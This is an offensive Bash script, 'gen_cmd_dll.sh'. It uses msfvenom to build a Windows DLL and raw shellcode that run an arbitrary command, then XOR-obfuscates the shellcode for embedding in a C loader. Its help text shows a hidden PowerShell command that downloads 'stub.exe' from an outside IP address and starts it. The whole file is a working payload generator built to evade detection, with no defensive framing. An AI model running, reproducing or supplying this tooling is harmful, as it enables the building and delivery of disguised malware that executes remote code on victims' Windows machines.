#!/bin/bash
# === gen_cmd_dll.sh v1.0 ===
# Generates DLL and obfuscated shellcode to run a command
# Usage: ./gen_cmd_dll.sh --cmd "powershell..." [--key 0x33] [--output payload]

set -euo pipefail

# === DEFAULT CONFIGURATION ===
CMD=""
OUTPUT="payload"
XOR_KEY_HEX="0x33"
XOR_KEY_DEC=51
SHELLCODE_BIN="payload.bin"
DLL_OUTPUT="payload.dll"
OBFUSCATED_SC="shellcode_xor.txt"

# === FUNCTIONS ===
show_help() {
    cat << EOF
Usage: $0 [options]

Options:
  --cmd CMD               Command to pack (e.g.: 'powershell -enc ...')
  --key HEX               XOR key in hex (default: $XOR_KEY_HEX)
  --output NAME           Base output name (generates NAME.dll and NAME.bin)
  -h, --help              Show this help

Example:
  $0 --cmd 'powershell.exe -nop -w hidden -c "IWR http://10.10.14.91/stub.exe -OutFile stub.exe; Start-Process stub.exe"' --key 0x33 --output maldll
EOF
    exit 0
}

# Function to obfuscate binary with XOR and convert to \x..
xor_obfuscate() {
    local input_bin="$1"
    local key_hex="$2"
    local key_dec=$(printf "%d" "$key_hex" 2>/dev/null) || { echo "[-] Invalid XOR key: $key_hex" >&2; exit 1; }
    local tmp_hex=$(mktemp)

    # Convert binary to flat hex
    xxd -p -c 20000 "$input_bin" | tr -d '\n' > "$tmp_hex"

    # Apply XOR and generate \x.. format
    python3 -c "
key = $key_dec
with open('$tmp_hex', 'r') as f:
    hex_str = f.read().strip()
bytes_list = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]
for b in bytes_list:
    if len(b) == 2:
        val = int(b, 16)
        xor_val = val ^ key
        print(f'\\\\x{xor_val:02x}', end='')
print()
" 

    # Cleanup
    rm -f "$tmp_hex"
}

# === PROCESS ARGUMENTS ===
while [[ $# -gt 0 ]]; do
    case $1 in
        --cmd)
            CMD="$2"
            shift 2
            ;;
        --key)
            XOR_KEY_HEX="$2"
            XOR_KEY_DEC=$(printf "%d" "$XOR_KEY_HEX" 2>/dev/null) || { echo "[-] Invalid XOR key: $XOR_KEY_HEX"; exit 1; }
            if ! [[ "$XOR_KEY_DEC" =~ ^[0-9]+$ ]]; then
                echo "[-] XOR key is not a valid number."
                exit 1
            fi
            shift 2
            ;;
        --output)
            OUTPUT="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            ;;
        *)
            echo "Error: unknown option: $1"
            echo "Use --help to see options."
            exit 1
            ;;
    esac
done

# === VALIDATION ===
if [[ -z "$CMD" ]]; then
    echo "[-] Missing command (--cmd). Use --help to see usage."
    exit 1
fi

# Adjust output names
DLL_OUTPUT="${OUTPUT}.dll"
SHELLCODE_BIN="${OUTPUT}.bin"
OBFUSCATED_SC="${OUTPUT}_shellcode.txt"

# === 1. Generate DLL with msfvenom ===
echo "[+] Generating DLL with command: $CMD"
msfvenom -p windows/x64/exec CMD="$CMD" -f dll -o "$DLL_OUTPUT" >/dev/null 2>&1 || {
    echo "[-] Error generating DLL with msfvenom. Is Metasploit installed?"
    exit 1
}

# === 2. Generate RAW shellcode (.bin) ===
echo "[+] Generating RAW shellcode (.bin)"
msfvenom -p windows/x64/exec CMD="$CMD" -f raw -o "$SHELLCODE_BIN" >/dev/null 2>&1 || {
    echo "[-] Error generating RAW shellcode."
    exit 1
}

# === 3. Obfuscate shellcode with XOR ===
echo "[+] Obfuscating shellcode with XOR key: $XOR_KEY_HEX ($XOR_KEY_DEC)"
xor_obfuscate "$SHELLCODE_BIN" "$XOR_KEY_HEX" > "$OBFUSCATED_SC"

# === 4. Final summary ===
echo ""
echo "[+] Generation completed:"
echo "    DLL:              $DLL_OUTPUT"
echo "    Shellcode RAW:    $SHELLCODE_BIN"
echo "    Shellcode XOR:    $OBFUSCATED_SC (key: $XOR_KEY_HEX)"
echo ""
echo "[*] Use the obfuscated shellcode in your loader (C, C++, etc)"
echo "[*] Example usage in C: unsigned char sc[] = $(cat $OBFUSCATED_SC);"